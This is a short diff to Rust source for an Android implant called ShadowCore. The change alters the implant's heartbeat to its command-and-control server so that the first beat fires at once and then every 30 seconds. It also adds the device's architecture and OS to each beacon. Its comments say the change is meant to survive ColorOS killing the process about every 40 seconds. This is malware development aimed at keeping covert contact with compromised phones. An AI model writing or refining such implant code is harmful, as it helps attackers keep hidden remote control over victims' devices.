@@ -216,18 +216,28 @@ impl ShadowCore {
             }
         });
 
-        // Heartbeat: tell the C2 we're alive every 60s
+        // Heartbeat: tell the C2 we're alive.
+        // The first beat must fire IMMEDIATELY, not after a 60s sleep: ColorOS reaps
+        // this process every ~40s, so a delayed first beat meant the implant could
+        // connect, get killed, and reconnect without the DO ever learning its identity.
         let hb_tx = tx_send.clone();
         let hb_id = self.implant_id.clone();
         tokio::spawn(async move {
+            let mut tick = tokio::time::interval(tokio::time::Duration::from_secs(30));
+            tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
             loop {
-                tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
+                tick.tick().await;
                 let hb = serde_json::json!({
                     "type": "heartbeat",
                     "id": hb_id,
                     "ts": std::time::SystemTime::now()
                         .duration_since(std::time::UNIX_EPOCH)
                         .map(|d| d.as_millis()).unwrap_or(0),
+                    "info": {
+                        "id": hb_id,
+                        "arch": std::env::consts::ARCH,
+                        "os": "android",
+                    },
                 });
                 if hb_tx.send(hb.to_string().into_bytes()).await.is_err() { break; }
             }
